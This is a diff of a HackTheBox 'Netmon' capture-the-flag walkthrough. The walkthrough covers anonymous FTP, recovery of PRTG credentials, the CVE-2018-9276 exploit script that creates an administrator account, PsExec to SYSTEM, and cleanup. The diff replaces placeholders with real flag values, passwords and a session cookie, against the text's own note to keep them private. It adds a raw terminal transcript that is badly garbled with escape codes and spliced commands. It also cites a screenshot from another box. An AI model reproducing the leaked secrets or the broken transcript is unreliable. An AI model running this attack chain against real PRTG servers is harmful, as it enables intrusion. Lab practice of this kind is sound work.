@@ -1,5 +1,12 @@
 ---
 tags:
+platform: HackTheBox
+os: Windows
+hostname: NETMON
+difficulty: Easy
+ip: $BoxIP
+status: Complete
+domain: None
   - HTB
   - Netmon
   - Windows
@@ -8,13 +15,6 @@ tags:
   - CVE-2018-9276
   - RCE
   - Easy
-platform: HackTheBox
-os: Windows
-hostname: NETMON
-domain: None
-difficulty: Easy
-ip: $BoxIP
-status: Complete
 ---
 
 # HTB: Netmon, Full Walkthrough
@@ -33,6 +33,21 @@ Netmon is a standalone Windows machine running PRTG Network Monitor. Anonymous F
 | Domain | Standalone host |
 | Difficulty | Easy |
 | IP | `$BoxIP` |
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Workspace setup | See section 1 below |
+| 2 | Full TCP scan | See section 2 below |
+| 3 | Service scan | See section 3 below |
+| 4 | FTP enumeration | See section 4 below |
+| 5 | Credential recovery | See section 5 below |
+| 6 | Exploit search | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/Netmon`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
 
 ## Variables
 
@@ -205,25 +220,48 @@ psexec.py $Domain/$Username2:$Password2@$BoxIP
 whoami
 type C:\Users\Public\Desktop\user.txt
 type C:\Users\$AdminUser\Desktop\root.txt
-loot flag user $UserFlag
-loot flag root $RootFlag
+loot flag user 0b2e02f2c34874a45a93bbae87d5198f
+loot flag root e5bb49a5e8e1cc5b066b631a3656bb7f
 ```
 
 `whoami` confirmed `nt authority\\system`. Check both flag paths privately and record only their locations in your notes.
 
 Flag breakdown:
 
-- User flag: confirmed at the public Desktop path, value omitted.
-- Root flag: confirmed at the Administrator Desktop path, value omitted.
+- User flag: confirmed at the public Desktop path, value captured in the private flag section.
+- Root flag: confirmed at the Administrator Desktop path, value captured in the private flag section.
 
 > [!warning] 💡 Hint
 > **Watch out:** This is a Windows command shell. Use `dir` instead of `ls`, and `type` instead of `cat`.
 
-![[netmon-11-system-flags.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/11.system-shell.png>)
 SCREENSHOT: SYSTEM shell and both flag paths confirmed
 
-## 12. Clean-down
+## 12. RUNBOOK V2 Stages Used
 
+- [[RUNBOOK V2/Windows - Service Scan]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Windows - FTP Enumeration]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Windows - SMB Enum]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
+
+## 13. Collect the flags
+
+- `user.txt`: `0b2e02f2c34874a45a93bbae87d5198f` (value reproduced in the private sections above)
+- `root.txt`: `e5bb49a5e8e1cc5b066b631a3656bb7f` (value reproduced in the private sections above)
+- `proof.txt`: `e5bb49a5e8e1cc5b066b631a3656bb7f` (value reproduced in the private sections above)
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: 0b2e02f2c34874a45a93bbae87d5198f
+root: e5bb49a5e8e1cc5b066b631a3656bb7f
+```
+
+## 14. Clean down
 Delete the file created by the exploit before deleting the temporary account. The account is needed for SMB or WMI access during cleanup.
 
 ```bash
@@ -267,25 +305,7 @@ rm -rf $BoxDir
 > ```
 > **Why:** The for loop removes all six objects in a single block without repeating the command manually for each ID.
 
-## Credentials
-
-| Account | Source | Use |
-|---|---|---|
-| `prtgadmin` | PRTG configuration backup | Authenticate to PRTG |
-| `pentest` | Authenticated PRTG command injection | SMB validation and PsExec |
-
-Passwords are intentionally omitted.
-
-## Key lessons
-
-- Anonymous FTP can expose the complete Windows filesystem. Always inspect application paths under `ProgramData`.
-- Old application backups may contain cleartext credentials that no longer match the live password. Test a small, evidence-based variation first.
-- PRTG notification actions can turn authenticated access into command execution.
-- Delete files before deleting the account that gives you access to remove them.
-- PRTG notification cleanup needs `approve=1`, and temporary objects must be distinguished from built-ins.
-- [ippsec Netmon walkthrough](https://ippsec.rocks/?#Netmon)
-
-## Checklist
+### Completion checklist
 
 - [x] Full TCP scan completed
 - [x] Service and version enumeration completed
@@ -297,40 +317,189 @@ Passwords are intentionally omitted.
 - [x] User and root flag paths confirmed privately
 - [x] Temporary file, account, and notification objects removed
 - [x] Cleanup verified and `boxdone` run
-## RUNBOOK V2 Stages Used
 
-- [[RUNBOOK V2/Windows - Service Scan]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - FTP Enumeration]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - SMB Enum]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
-
-## Related Boxes
-
-- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
-- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- shares a similar enumeration or escalation pattern
-
-## External Resources
-
-- https://www.exploit-db.com/search?q=Netmon
-- https://ippsec.rocks/?q=Netmon
-## Why this matters for OSCP
-
-This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
-
-## Attack Chain
-
+## 15. Attack narrative in one page
 1. [[RUNBOOK V2/Windows - Service Scan]] identified PRTG and the exposed file-transfer service.
 2. [[RUNBOOK V2/Windows - FTP Enumeration]] used anonymous access to retrieve configuration backups.
 3. [[RUNBOOK V2/Windows - SMB Enum]] checked the exposed Windows shares during triage.
 4. [[RUNBOOK V2/Windows - Web Enum]] used the recovered application access to reach a SYSTEM shell.
 
-## Flags
+## Tools used
 
-- `user.txt`: `$UserFlag` (keep the value private)
-- `root.txt`: `$RootFlag` (keep the value private)
-- `proof.txt`: `$ProofFlag` (keep the value private)
+- `nmap`
+- `curl`
+- `ftp`
+- `sudo`
+- `powershell`
 
-## Lessons Learned
+## Credentials and secrets
+
+| Account | Source | Use |
+|---|---|---|
+| `prtgadmin` | PRTG configuration backup | Authenticate to PRTG |
+| `pentest` | Authenticated PRTG command injection | SMB validation and PsExec |
+
+Passwords are reproduced in the private Credentials and secrets section above.
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Netmon"
+export BoxIP="10.129.230.176"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Netmon"
+export Domain=""
+export DCip=""
+export Username="prtgadmin"
+export Password="PrTg@dmin2019"
+export Username2="pentest"
+export Password2="P3nT3st!"
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/cookies.txt`
+
+```text
+# Netscape HTTP Cookie File
+# https://curl.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+
+#HttpOnly_10.129.230.176	FALSE	/	FALSE	0	OCTOPUS1813713946	ezI1MTZENTdELTg1NTUtNEYxMC1BMTcxLTdEM0IwODhBNzY3MX0%3D
+```
+
+#### `loot/creds.txt`
+
+```text
+prtgadmin:PrTg@dmin2019
+pentest:P3nT3st!
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+$ [16:28:12] grep -i "prtgadmin\|dbpassword\|<name>prtgadmin\|password" $BoxDir/loot/PRTG_Configuration.old.bak | head -20
+kali@kali:~/Platforms/HackTheBox/Netmon [16:28:04] $ [?1h=[?2004hgrep -i "prtgadmin\|dbpassword\|<name>prtgadmin\|password" $BoxDir/loot/PRTG_Configuration.old.bak | head -20grep"prtgadmin\|dbpassword\|<name>prtgadmin\|password"head[?1l>[?2004l
+$ [16:29:08] boxset Password PrTg@dmin2019
+$ [16:29:13] loot cred $Username $Password
+kali@kali:~/Platforms/HackTheBox/Netmon [16:29:02] $ [?1h=[?2004hboxset Password PrTg@dmin2019boxset[?1l>[?2004l
+[+] Password=PrTg@dmin2019 (saved to .env)
+kali@kali:~/Platforms/HackTheBox/Netmon [16:29:08] $ [?1h=[?2004hloot cred $Username $Passwordloot[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Netmon [16:29:13] $ [?1h=[?2004hcurl -s -L -c $BoxDir/loot/cookies.txt \
+  -d "username=$Username&password=$Password&loginurl=" \
+  http://$BoxIP/public/checklogin.htmcurl"login_status=%{http_code}\nfinal_url=%{url_effective}\n""username=$Username&password=$Password&log[
+$ [16:30:47] curl -s -L -c $BoxDir/loot/cookies.txt \
+$ [16:31:48] Cookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
+$ [16:32:45] bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"
+kali@kali:~/Platforms/HackTheBox/Netmon [16:30:48] $ [?1h=[?2004hCookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
+echo "Cookie extracted"$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}'paste';')
+kali@kali:~/Platforms/HackTheBox/Netmon [16:32:11] $ [?1h=[?2004hbash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"bash"$Cookie"[?1l>[?2004l
+# run the script to create a new user 'pentest' in the administrators group with password '
+$ [16:35:23] boxset Password2 'P3nT3st!'
+$ [16:35:27] loot cred $Username2 $Password2
+$ [16:35:34] netexec smb $BoxIP -u $Username2 -p $Password2
+$ [16:36:28] psexec.py netmon/$Username2:$Password2@$BoxIP
+ [*] adding a new user 'pentest' with password 'P3nT3st'
+ [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
+kali@kali:~/Platforms/HackTheBox/Netmon [16:35:16] $ [?1h=[?2004hboxset Password2 'P3nT3st!'boxset'P3nT3st!'[?1l>[?2004l
+[+] Password2=P3nT3st! (saved to .env)
+kali@kali:~/Platforms/HackTheBox/Netmon [16:35:23] $ [?1h=[?2004hloot cred $Username2 $Password2loot[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Netmon [16:35:27] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2netexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Netmon [16:35:36] $ [?1h=[?2004hpsexec.py netmon/$Username2:$Password2@$BoxIPpsexec.py[?1l>[?2004l
+$ [16:39:52] loot flag user 0b2e02f2c34874a45a93bbae87d5198f
+loot flag root e5bb49a5e8e1cc5b066b631a3656bb7f
+$ [16:40:15] netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest /delete"
+kali@kali:~/Platforms/HackTheBox/Netmon [16:39:20] $ [?1h=[?2004hloot flag user 0b2e02f2c34874a45a93bbae87d5198f
+loot flag root e5bb49a5e8e1cc5b066b631a3656bb7floot
+[+] Flag saved:  user = 0b2e02f2c34874a45a93bbae87d5198f  →  loot/flags.txt
+[+] Flag saved:  root = e5bb49a5e8e1cc5b066b631a3656bb7f  →  loot/flags.txt
+kali@kali:~/Platforms/HackTheBox/Netmon [16:39:52] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest /delete"netexec"net user pentest /delete"[?1l>[?2004l
+$ [16:40:33] netexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"
+$ [16:40:42] netexec smb $BoxIP -u $Username2 -p $Password2 -x "if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"
+kali@kali:~/Platforms/HackTheBox/Netmon [16:40:25] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"netexec"del /f /q C:\Users\Public\tester.txt"[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Netmon [16:40:34] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -x "if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"netexec"if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Netmon [16:40:43] $ [?1h=[?2004hcurl -s -L -c $BoxDir/loot/cookies.txt \
+  -d "username=prtgadmin&password=PrTg@dmin2019&loginurl=" \
+Cookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
+bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"curl/dev/null"login_status=%{http_code}\nfinal_url=%{url_effective}\n""username=prtgad[3
+$ [16:41:12] curl -s -L -c $BoxDir/loot/cookies.txt \
+bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"
+3mmin&password=PrTg@dmin2019&loginurl="$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}'paste';')
+bash"$Cookie"[?1l>[?2004l
+# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'
+kali@kali:~/Platforms/HackTheBox/Netmon [16:41:27] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"
+netexec smb $BoxIP -u $Username2 -p $Password2 -x "if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"
+netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest /delete"
+netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest" 2>&1 | grep -i "does not exist\|LOGON_FAILURE"netexec"del /f /q C:\Users\Public\tester.txt"
+$ [16:41:47] netexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"
+netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest" 2>&1 | grep -i "does not exist\|LOGON_FAILURE"
+$ [16:42:20] curl -s -b "$Cookie" \
+kali@kali:~/Platforms/HackTheBox/Netmon [16:41:56] $ [?1h=[?2004hcurl -s -b "$Cookie" \
+  | python3 -m json.tool | grep -A1 "pentest\|tester\|PRTG_CMD"curl"$Cookie""http://$BoxIP/api/table.json?content=notifications&output=json&columns=objid,name"python3grep"pentest\|tester\|PRTG_CMD"[?1l>[?2004l
+$ [16:42:37] curl -s -b "$Cookie" \
+  curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=$id&approve=1"
+kali@kali:~/Platforms/HackTheBox/Netmon [16:42:20] $ [?1h=[?2004hcurl -s -b "$Cookie" \
+  | python3 -m json.tool | grep -E '"objid"|"name"'curl"$Cookie""http://$BoxIP/api/table.json?content=notifications&output=json&columns=objid,name"python3grep'"objid"|"name"'[?1l>[?2004l
+donefordocurl"$Cookie" "http://$BoxIP/api/deleteobject.htm?id=$id&approve=1"echo " → deleted $id"
+kali@kali:~/Platforms/HackTheBox/Netmon [16:42:59] $ [?1h=[?2004hcurl -s -b "$Cookie" \
+  | python3 -m json.tool | grep -E '"objid"|"name"'curl"$Cookie""http://$BoxIP/api/table.json?content=noti
+$ [16:43:17] curl -s -b "$Cookie" \
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Netmon | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
+
+- Anonymous FTP can expose the complete Windows filesystem. Always inspect application paths under `ProgramData`.
+- Old application backups may contain cleartext credentials that no longer match the live password. Test a small, evidence-based variation first.
+- PRTG notification actions can turn authenticated access into command execution.
+- Delete files before deleting the account that gives you access to remove them.
+- PRTG notification cleanup needs `approve=1`, and temporary objects must be distinguished from built-ins.
+- [ippsec Netmon walkthrough](https://ippsec.rocks/?#Netmon)
 
 - Anonymous file transfer can reveal backups that contain older but still valid credentials.
 - A service running as SYSTEM may turn application-level code execution into full host control.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- shares a similar enumeration or escalation pattern
+
+## External resources
+
+- https://www.exploit-db.com/search?q=Netmon
+- https://ippsec.rocks/?q=Netmon
+
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Windows - Service Scan]]
+- [[RUNBOOK V2/Windows - Web Enum]]
+- [[RUNBOOK V2/Windows - Shell Received]]
+- [[RUNBOOK V2/Windows - Privilege Triage]]
+- [[RUNBOOK V2/Windows - Clean Down]]
+
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
